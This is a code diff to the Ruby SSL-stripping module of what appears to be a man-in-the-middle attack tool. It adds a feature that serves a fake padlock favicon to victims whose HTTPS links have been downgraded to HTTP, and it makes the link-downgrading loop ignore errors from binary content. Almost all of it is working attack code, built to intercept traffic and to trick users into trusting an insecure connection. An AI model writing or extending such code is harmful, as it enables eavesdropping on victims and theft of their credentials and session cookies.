@@ -25,6 +25,7 @@ class Strip
   def initialize
     @urls    = URLMonitor.new
     @cookies = CookieMonitor.new
+    @favicon = Response.from_file( File.dirname(__FILE__) + '/lock.ico', 'image/x-icon' )
   end
 
   # Check if the +request+ is a result of a stripped link/redirect and handle
@@ -35,6 +36,7 @@ class Strip
     response = process_cookies!(request)
     if response.nil?
       process_stripped!(request)
+      response = spoof_favicon!(request)
     end
     response
   end
@@ -92,6 +94,21 @@ class Strip
     end
   end
 
+  # If +request+ is the favicon of a stripped host, send our spoofed lock icon.
+  def spoof_favicon!(request)
+    link = @urls.normalize( request.host )
+    if @urls.was_stripped?( request.client, link ) and is_favicon?(request)
+      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Sending spoofed favicon '#{request.to_url }'."
+      return @favicon
+    end
+    nil
+  end
+
+  # Return true if +request+ is a favicon request.
+  def is_favicon?(request)
+    ( request.url.include?('.ico') or request.url.include?('favicon') )
+  end
+
   # If the +response+ is a redirect to a HTTPS location, patch the +response+ and
   # retry the +request+ via SSL.
   def process_redirection!(request,response)
@@ -116,14 +133,17 @@ class Strip
   def process_body!(request, response)
     # parse body
     links = []
-    response.body.scan( HTTPS_URL_RE ).uniq.each do |link|
-      if link[0].include?('.')
-        link       = @urls.normalize( link[0] )
-        downgraded = @urls.downgrade( link )
+    begin
+      response.body.scan( HTTPS_URL_RE ).uniq.each do |link|
+        if link[0].include?('.')
+          link       = @urls.normalize( link[0] )
+          downgraded = @urls.downgrade( link )
 
-        links << [link, downgraded]
+          links << [link, downgraded]
+        end
       end
-    end
+    # handle errors due to binary content
+    rescue; end
 
     unless links.empty?
       Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Stripping #{links.size} HTTPS link#{if links.size > 1 then 's' else '' end} inside '#{request.to_url}'."
